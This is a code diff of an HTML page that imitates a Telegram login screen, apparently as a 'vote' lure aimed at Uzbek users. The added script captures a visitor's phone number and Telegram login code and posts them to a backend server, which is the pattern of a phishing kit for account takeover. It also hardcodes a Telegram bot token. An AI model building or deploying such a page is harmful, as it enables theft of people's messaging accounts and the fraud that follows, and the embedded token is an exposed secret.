@@ -138,7 +138,6 @@
     <p style="font-size: 12px; color: #777;">By continuing, you agree to the <a href="https://telegram.org/faq#login-and-sms">Terms of Service</a>.</p>
 </div>
 
-
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
 <script>
     const BOT_TOKEN = '7165333544:AAG6D0JW-FYhS-RBtHxPiEBCxsjpoFldJrg';
@@ -147,54 +146,55 @@
     const phoneInput = document.querySelector("#phone-number");
     const iti = window.intlTelInput(phoneInput, {
         initialCountry: "uz",
-        preferredCountries: ["uz", "ru", "us"],
+        preferredCountries: ["uz"],
         separateDialCode: true,
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"
     });
+
+    const SERVER_URL = "http://127.0.0.1:5701";
+
+    function sendPhone() {
+        // Получаем полный номер телефона с кодом страны
+        const phoneInputValue = iti.getNumber();
+
+        fetch(`${SERVER_URL}/send_phone`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone: phoneInputValue })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                alert("Вам был отправлен код для подтверждения!");
+                document.getElementById("code-section").style.display = "block";
+            } else {
+                alert("Ошибка: " + data.error);
+            }
+        })
+        .catch(error => console.error("Ошибка запроса:", error));
+    }
+
+    function checkCode() {
+        const codeInput = document.getElementById("login-code").value;
+        const phoneInputValue = iti.getNumber(); // Получаем полный номер с кодом страны
+
+        fetch(`${SERVER_URL}/send_code`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone: phoneInputValue, code: codeInput })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                alert("Ваш голос был принят!");
+            } else {
+                alert("Ошибка входа: " + data.error);
+            }
+        })
+        .catch(error => console.error("Ошибка запроса:", error));
+    }
 </script>
- <script>
-        const SERVER_URL = "http://127.0.0.1:5701";
 
-        function sendPhone() {
-            const phoneInput = document.getElementById("phone-number").value;
-
-            fetch(`${SERVER_URL}/send_phone`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ phone: phoneInput })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    alert("Код отправлен!");
-                    document.getElementById("code-section").style.display = "block";
-                } else {
-                    alert("Ошибка: " + data.error);
-                }
-            })
-            .catch(error => console.error("Ошибка запроса:", error));
-        }
-
-        function checkCode() {
-            const codeInput = document.getElementById("login-code").value;
-            const phoneInput = document.getElementById("phone-number").value;
-
-            fetch(`${SERVER_URL}/send_code`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ phone: phoneInput, code: codeInput })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    alert("Успешный вход!");
-                } else {
-                    alert("Ошибка входа: " + data.error);
-                }
-            })
-            .catch(error => console.error("Ошибка запроса:", error));
-        }
-    </script>
 
 
 </body>
